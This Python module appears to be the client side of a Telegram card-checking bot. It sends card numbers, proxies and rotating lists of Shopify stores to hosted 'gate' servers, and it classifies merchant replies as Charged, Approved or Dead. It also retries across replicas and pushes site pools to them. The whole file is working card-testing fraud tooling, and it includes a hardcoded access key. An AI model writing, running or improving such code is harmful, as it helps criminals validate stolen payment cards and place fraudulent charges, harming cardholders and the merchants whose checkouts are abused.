"""
Shopify API Manager for mybot.
Integrates the hosted Shopify API servers with:
  - Dynamic health checking (/health) & active pool management
  - Intelligent load balancing & failover across replicas
  - Standardized /shopify and /check endpoint dispatchers
  - Pool synchronization: bot pushes global_sites from MongoDB to replicas

v3 patches (2026-10):
  - check_shopify_card() accepts fallback_sites / attempts / auto and
    forwards them to the API so the server rotates through the bot's
    real pool instead of its local sites.txt.
  - If a replica returns "SITE_ERROR / exhausted", try a DIFFERENT
    replica before giving up — each replica has its own quarantine map.
  - auto_health_check() only marks a replica active if it has a non-empty
    pool, so empty replicas never receive traffic.
  - push_sites_to_all_replicas() pushes the bot's current site list to
    every replica's /sync-sites endpoint (used by main.py's sync loop).
"""

import asyncio
import aiohttp
import logging
import random
import time
import urllib.parse
from typing import Optional, Dict, Any, List, Tuple

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HOSTED API SERVERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
API_SERVERS = [
    "https://starkz-shopi.duckdns.org",
    "https://starkz-shopi1.duckdns.org",
    "https://starkz-shopi2.duckdns.org",
]

SHOPIFY_API_KEY = "oozaruhshop"
ALT_API_KEY     = "oozaruhshop"

ACTIVE_API_SERVERS: List[str] = API_SERVERS.copy()
SERVER_HEALTH: Dict[str, dict] = {}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SERVER SELECTOR & FORMATTERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_active_server() -> str:
    pool = ACTIVE_API_SERVERS if ACTIVE_API_SERVERS else API_SERVERS
    return random.choice(pool)


def get_active_servers_excluding(seen: set) -> List[str]:
    remaining = [s for s in ACTIVE_API_SERVERS if s not in seen]
    if not remaining:
        remaining = [s for s in API_SERVERS if s not in seen]
    return remaining or list(API_SERVERS)


def format_proxy(proxy: Optional[str]) -> Optional[str]:
    if not proxy:
        return None
    p = proxy.strip()
    if p.startswith("http://") or p.startswith("https://"):
        parsed = urllib.parse.urlparse(p)
        if parsed.username and parsed.password:
            return f"{parsed.hostname}:{parsed.port}:{parsed.username}:{parsed.password}"
        return f"{parsed.hostname}:{parsed.port}"
    return p


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GATE RESPONSE CLASSIFIER (August 2026 Standards)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def classify_gate_response(response_msg: str, raw_dict: Optional[dict] = None, gateway: str = "") -> dict:
    if raw_dict is None:
        raw_dict = {}

    charged_flag = str(raw_dict.get('Charged', '')).lower() == 'true' or str(raw_dict.get('charged', '')).lower() == 'true'
    approved_flag = str(raw_dict.get('Approved', '')).lower() == 'true' or str(raw_dict.get('approved', '')).lower() == 'true'

    if charged_flag:
        return {'status': 'Charged', 'retry': False}
    if approved_flag:
        return {'status': 'Approved', 'retry': False}

    msg = str(response_msg or "").strip()
    msg_upper = msg.upper()

    CHARGED_KEYWORDS = [
        'ORDER_PLACED', 'PAYMENT_COMPLETE', 'SUBMITSUCCESS', 'ORDER_CREATED',
        'PROCESSEDRECEIPT', 'PAYMENT SUCCESSFUL', 'SUCCEEDED', 'AUTHORISED',
        'PAYMENT ACCEPTED', 'THANK YOU FOR YOUR ORDER', 'THANK YOU', 'CHARGED',
        'SALE', 'RECEIPT', 'RECEIPT_ID', 'CONFIRMATION_NUMBER', 'ORDER_CONFIRMED',
        'TRANSACTION_COMPLETED', 'ORDER_STATUS_URL', 'ORDER_SUCCESS'
    ]
    if any(k in msg_upper for k in CHARGED_KEYWORDS):
        return {'status': 'Charged', 'retry': False}

    INSUFFICIENT_FUNDS_KEYWORDS = [
        'INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS', 'NOT_ENOUGH_BALANCE',
        'NOT ENOUGH BALANCE', 'LOW_BALANCE', '140'
    ]
    CVV_MISMATCH_KEYWORDS = [
        'INVALID_CVC', 'INCORRECT_CVC', 'CVC_DECLINED', 'CVV MISMATCH', 'CVV_MISMATCH',
        'SECURITY CODE', 'SECURITY_CODE', 'CVC CHECK FAILED', 'CVC_CHECK', 'INVALID_CVV',
        '103', '144'
    ]
    THREEDS_KEYWORDS = [
        '3DS_REQUIRED', '3D_SECURE', '3DS', 'AUTHENTICATION_REQUIRED',
        'ACTION_REQUIRED', 'REDIRECTSHOPPER', 'CHALLENGESHOPPER',
        'IDENTIFYSHOPPER', 'PRESENTTOSHOPPER', '128'
    ]
    AVS_MISMATCH_KEYWORDS = [
        'INCORRECT_ZIP', 'ZIP_MISMATCH', 'AVS_FAILED', 'BILLING_ADDRESS_MISMATCH',
        'ADDRESS VERIFICATION FAILED', 'POSTAL_CODE_MISMATCH'
    ]
    APPROVED_KEYWORDS = [
        'APPROVED', 'APPROVE_WITH_ID', 'SUCCESS', 'ZERO AUTH', 'LIVE', 'CCN LIVE',
        'CARD_TESTING'
    ]

    if any(k in msg_upper for k in INSUFFICIENT_FUNDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in CVV_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in THREEDS_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in AVS_MISMATCH_KEYWORDS):
        return {'status': 'Approved', 'retry': False}
    if any(k in msg_upper for k in APPROVED_KEYWORDS) and not any(k in msg_upper for k in ['NOT APPROVED', 'UNAPPROVED', 'DECLINED']):
        return {'status': 'Approved', 'retry': False}

    SITE_ERROR_KEYWORDS = [
        'NO_PRODUCT', 'THROTTLED', 'TIMEOUT', 'TOKENIZATION_FAILED',
        'SITE_REQUIRES_LOGIN', 'CART_FAILED', 'CHECKOUT_FAILED',
        'NEGOTIATE_FAILED', 'GRAPHQL_ERROR', 'SESSION_EXPIRED',
        'NO_SESSION_TOKEN', 'NO_ATTEMPT_TOKEN', 'NO_SELLER_PROPOSAL',
        'CHECKPOINTDENIED', 'NO_SHOPIFY_PAYMENTS_GATEWAY', 'SUBMIT_FAILED',
        'ORDER_CREATION_FAILED', 'NO_PAYMENT_REQUIRED', 'PROXY ERROR',
        'CONNECTION REFUSED', 'HOST UNREACHABLE', 'INTERNAL_SERVER_ERROR',
        'GATEWAY_TIMEOUT', 'BAD_GATEWAY', 'CLOUDFLARE_BLOCKED',
        'MERCHANT_ACCOUNT_CLOSED', 'GATEWAY_NOT_CONFIGURED',
        'SITE DEAD', 'INVALID SITE', 'CAPTCHA_REQUIRED', 'NOT_SUPPORTED',
        'FAILED TO GET TOKEN', 'SITE ERROR'
    ]
    if any(k in msg_upper for k in SITE_ERROR_KEYWORDS):
        return {'status': 'Site Error', 'retry': True}

    return {'status': 'Dead', 'retry': False}


def _is_pool_exhausted(data: dict) -> bool:
    code = str(data.get("Response", "")).upper()
    msg = str(data.get("Message", "") or data.get("message", "")).lower()
    if code not in ("SITE_ERROR", "NO_PRODUCT", ""):
        return False
    return any(
        k in msg for k in (
            "exhausted", "quarantined", "pool is empty",
            "all sites excluded", "all sites quarantined",
            "no sites", "no usable sites",
        )
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLIENT ENDPOINTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def check_shopify_card(
    site: str,
    cc: str,
    proxy: Optional[str] = None,
    session: Optional[aiohttp.ClientSession] = None,
    max_retries: int = 3,
    timeout_sec: float = 40.0,
    fallback_sites: Optional[List[str]] = None,
    attempts: int = 15,
    auto: bool = False,
) -> dict:
    if not site.startswith("http"):
        site = f"https://{site}"

    proxy_str = format_proxy(proxy)
    close_session = False
    if session is None:
        client_timeout = aiohttp.ClientTimeout(total=timeout_sec)
        session = aiohttp.ClientSession(timeout=client_timeout)
        close_session = True

    fallback_str: Optional[str] = None
    if fallback_sites:
        cleaned = [s.strip() for s in fallback_sites if s and s.strip()]
        fallback_str = ",".join(cleaned[:20])

    try:
        tested_servers: set = set()
        last_error: Optional[str] = None

        for attempt in range(max_retries):
            candidates = get_active_servers_excluding(tested_servers)
            if not candidates:
                candidates = list(API_SERVERS)
            server = random.choice(candidates)
            tested_servers.add(server)

            params = {
                "site":     site,
                "cc":       cc,
                "key":      SHOPIFY_API_KEY,
                "attempts": str(attempts),
            }
            if proxy_str:
                params["proxy"] = proxy_str
            if auto:
                params["auto"] = "true"
            if fallback_str:
                params["fallback_sites"] = fallback_str

            url = f"{server}/shopify?{urllib.parse.urlencode(params)}"

            try:
                async with session.get(url, timeout=timeout_sec) as resp:
                    if resp.status == 200:
                        data = await resp.json()

                        if _is_pool_exhausted(data):
                            last_error = str(data.get("Message", "pool exhausted"))
                            logging.info(
                                "[shopify_api] replica %s pool exhausted (%s) — "
                                "trying a different replica (attempt %d/%d)",
                                server, last_error, attempt + 1, max_retries,
                            )
                            if attempt < max_retries - 1:
                                await asyncio.sleep(0.15)
                                continue
                            resp_msg = str(data.get("Response", "SITE_ERROR"))
                            gateway = data.get("Gate", data.get("Gateway", "Shopify Payments"))
                            data["Classification"] = classify_gate_response(resp_msg, data, gateway)
                            data["Status"] = False
                            return data

                        resp_msg = data.get("Response", data.get("card_response", "Unknown"))
                        gateway = data.get("Gate", data.get("Gateway", "Shopify Payments"))
                        data["Classification"] = classify_gate_response(resp_msg, data, gateway)
                        data["Status"] = data["Classification"]["status"] in ("Charged", "Approved")
                        return data

                    elif resp.status in (401, 403):
                        alt_params = dict(params)
                        alt_params["key"] = ALT_API_KEY
                        alt_url = f"{server}/shopify?{urllib.parse.urlencode(alt_params)}"
                        try:
                            async with session.get(alt_url, timeout=timeout_sec) as alt_resp:
                                if alt_resp.status == 200:
                                    data = await alt_resp.json()
                                    if _is_pool_exhausted(data):
                                        last_error = str(data.get("Message", "pool exhausted"))
                                        if attempt < max_retries - 1:
                                            await asyncio.sleep(0.15)
                                            continue
                                    resp_msg = data.get("Response", data.get("card_response", "Unknown"))
                                    gateway = data.get("Gate", data.get("Gateway", "Shopify Payments"))
                                    data["Classification"] = classify_gate_response(resp_msg, data, gateway)
                                    data["Status"] = data["Classification"]["status"] in ("Charged", "Approved")
                                    return data
                        except Exception as e:
                            last_error = f"alt-key: {e}"
                            logging.warning(
                                "[shopify_api] alt-key fetch failed on %s: %s", server, e
                            )
                    else:
                        last_error = f"HTTP {resp.status}"
                        logging.warning(
                            "[shopify_api] %s returned HTTP %s (attempt %d/%d)",
                            server, resp.status, attempt + 1, max_retries,
                        )

            except Exception as e:
                last_error = f"{type(e).__name__}: {e}"
                logging.warning(
                    "[shopify_api] attempt %d/%d on %s failed: %s",
                    attempt + 1, max_retries, server, e,
                )
                await asyncio.sleep(0.3)

        return {
            "Response":       "API_REPLICAS_UNREACHABLE",
            "Message":        last_error or "All replicas failed",
            "CC":             cc,
            "Price":          "0.00",
            "Gate":           "Shopify Payments",
            "Site":           site,
            "Charged":        "False",
            "Approved":       "False",
            "Time":           "0s",
            "Status":         False,
            "Classification": {"status": "Site Error", "retry": True},
        }
    finally:
        if close_session:
            await session.close()


async def check_site(
    site: str,
    card: Optional[str] = None,
    proxy: Optional[str] = None,
    session: Optional[aiohttp.ClientSession] = None,
    timeout_sec: float = 20.0,
) -> dict:
    if not site.startswith("http"):
        site = f"https://{site}"

    proxy_str = format_proxy(proxy)
    close_session = False
    if session is None:
        client_timeout = aiohttp.ClientTimeout(total=timeout_sec)
        session = aiohttp.ClientSession(timeout=client_timeout)
        close_session = True

    try:
        server = get_active_server()
        params = {"site": site, "key": SHOPIFY_API_KEY}
        if card:
            params["card"] = card
        if proxy_str:
            params["proxy"] = proxy_str

        url = f"{server}/check?{urllib.parse.urlencode(params)}"
        try:
            async with session.get(url, timeout=timeout_sec) as resp:
                if resp.status == 200:
                    return await resp.json()
        except Exception:
            pass

        for alt_server in API_SERVERS:
            if alt_server == server:
                continue
            alt_params = {"site": site, "key": SHOPIFY_API_KEY}
            if card:
                alt_params["card"] = card
            if proxy_str:
                alt_params["proxy"] = proxy_str
            try:
                async with session.get(
                    f"{alt_server}/check?{urllib.parse.urlencode(alt_params)}",
                    timeout=timeout_sec,
                ) as resp:
                    if resp.status == 200:
                        return await resp.json()
            except Exception:
                continue

        return {
            "valid":  False,
            "site":   site,
            "reason": "CHECK_FAILED",
            "detail": "All replicas unreachable",
        }
    finally:
        if close_session:
            await session.close()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# POOL SYNC — push bot's site list to every replica
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def push_sites_to_all_replicas(sites: List[str]) -> Dict[str, Any]:
    """
    Push the bot's current site pool to every replica's /sync-sites endpoint.

    Called from main.py's background sync loop every 5 minutes and after
    any admin write to global_sites. Uses JSON body so large pools (500+)
    don't hit URL length limits.
    """
    if not sites:
        return {"pushed": 0, "results": {}, "error": "empty list"}

    # Cap to avoid overloading replicas. 500 covers the practical pool size.
    to_push = sites[:500]

    results: Dict[str, Any] = {}
    timeout = aiohttp.ClientTimeout(total=25)

    async with aiohttp.ClientSession(timeout=timeout) as session:
        for server in API_SERVERS:
            url = f"{server}/sync-sites"
            try:
                payload = {"sites": to_push, "key": SHOPIFY_API_KEY}
                async with session.post(url, json=payload) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        results[server] = {
                            "ok":        True,
                            "pool_size": data.get("pool_size", 0),
                            "previous":  data.get("previous", 0),
                        }
                    else:
                        results[server] = {"ok": False, "error": f"HTTP {resp.status}"}
            except Exception as e:
                results[server] = {"ok": False, "error": f"{type(e).__name__}: {e}"}

    return {"pushed": len(to_push), "results": results}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND HEALTH CHECK LOOP
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def auto_health_check():
    logging.info("[shopify_api] auto_health_check started for %d API servers.",
                 len(API_SERVERS))
    while True:
        try:
            active: List[str] = []
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                for api in API_SERVERS:
                    t0 = time.time()
                    try:
                        async with session.get(f"{api}/health") as resp:
                            elapsed = round(time.time() - t0, 3)
                            if resp.status != 200:
                                SERVER_HEALTH[api] = {
                                    "status":     f"HTTP {resp.status}",
                                    "latency":    f"{elapsed}s",
                                    "last_check": time.time(),
                                }
                                continue

                            data = await resp.json()
                            version = data.get("version", "?")
                            pool_size = int(data.get("pool_size", 0) or 0)
                            pool_source = data.get("pool_source", "?")
                            healthy = data.get("file_pool_live")
                            if healthy is None:
                                healthy = data.get("healthy_sites")

                            pool_usable = pool_size > 0 and (
                                healthy is None or int(healthy) > 0
                            )
                            if pool_usable:
                                active.append(api)
                                SERVER_HEALTH[api] = {
                                    "status":           "online",
                                    "version":          version,
                                    "pool_source":      pool_source,
                                    "latency":          f"{elapsed}s",
                                    "pool_size":        pool_size,
                                    "healthy_sites":    healthy,
                                    "site_concurrency": data.get("site_concurrency", 0),
                                    "max_price":        data.get("max_price", 0),
                                    "last_check":       time.time(),
                                }
                            else:
                                SERVER_HEALTH[api] = {
                                    "status":     "empty pool",
                                    "version":    version,
                                    "pool_source": pool_source,
                                    "latency":    f"{elapsed}s",
                                    "pool_size":  pool_size,
                                    "healthy":    healthy,
                                    "last_check": time.time(),
                                }
                    except Exception as e:
                        SERVER_HEALTH[api] = {
                            "status":     f"offline ({type(e).__name__})",
                            "latency":    "-",
                            "last_check": time.time(),
                        }

            if active:
                ACTIVE_API_SERVERS.clear()
                ACTIVE_API_SERVERS.extend(active)
                logging.debug(
                    "[shopify_api] health check: %d/%d replicas active",
                    len(active), len(API_SERVERS),
                )
            else:
                logging.warning(
                    "[shopify_api] no replica reported a usable pool — "
                    "keeping previous active list (%d)",
                    len(ACTIVE_API_SERVERS),
                )
        except Exception as e:
            logging.error("[shopify_api] health check loop exception: %s", e)

        await asyncio.sleep(60)


def get_health_summary() -> str:
    lines = [
        "<b>⚡ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗔𝗣𝗜 𝗖𝗹𝘂𝘀𝘁𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀</b>",
        "━━━━━━━━━━━━━━━━━━━━━",
    ]
    for idx, s in enumerate(API_SERVERS, 1):
        info = SERVER_HEALTH.get(s, {})
        status = info.get("status", "unknown")
        latency = info.get("latency", "-")
        version = info.get("version", "?")
        pool_size = info.get("pool_size", 0)
        healthy = info.get("healthy_sites")
        pool_source = info.get("pool_source", "?")

        domain = urllib.parse.urlparse(s).netloc.split(".")[0]
        icon = "🟢" if status == "online" else (
            "🟡" if status == "empty pool" else "🔴"
        )

        lines.append(f"{icon} <b>Replica {idx}</b> (<code>{domain}</code>)")
        lines.append(f"  ├ Status: <code>{status}</code>")
        lines.append(f"  ├ Version: <code>{version}</code> ({pool_source})")
        lines.append(f"  ├ Pool: <code>{pool_size}</code>"
                     + (f" · healthy <code>{healthy}</code>" if healthy is not None else ""))
        lines.append(f"  └ Latency: <code>{latency}</code>")

    lines.append("━━━━━━━━━━━━━━━━━━━━━")
    lines.append(f"📊 <b>Active Replicas:</b> {len(ACTIVE_API_SERVERS)}/{len(API_SERVERS)}")
    return "\n".join(lines)
